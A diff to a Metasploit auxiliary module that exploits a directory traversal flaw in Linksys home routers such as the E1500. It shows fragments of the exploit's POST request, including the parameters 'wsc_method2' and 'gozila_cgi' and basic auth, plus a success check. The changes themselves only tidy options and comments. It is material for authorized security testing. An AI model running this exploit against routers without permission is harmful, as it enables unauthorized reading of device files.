@@ -15,7 +15,6 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'        => 'Linksys Directory Traversal Vulnerability',
-			'Version'     => '$$',
 			'Description' => %q{
 				This module exploits a directory traversal vulnerablity which is present in different
 				Linksys home routers like the E1500.
@@ -64,7 +63,7 @@ class Metasploit3 < Msf::Auxiliary
 			'method'  => 'POST',
 			'uri'     => uri,
 			'authorization' => basic_auth(user,pass),
-			'encode_params' => false,
+			#'encode_params' => false,
 			'vars_post' => {
 				"submit_type" => "wsc_method2",
 				"change_action" => "gozila_cgi",
@@ -73,6 +72,7 @@ class Metasploit3 < Msf::Auxiliary
 		})
 		#puts res.body.length
 		#puts res
+		#without res.body.length we get lots of false positives
 		if (res and res.code == 200 and res.body.length > 10)
 			print_good("#{rhost}:#{rport} - Request may have succeeded on file #{file}")
 			report_web_vuln({
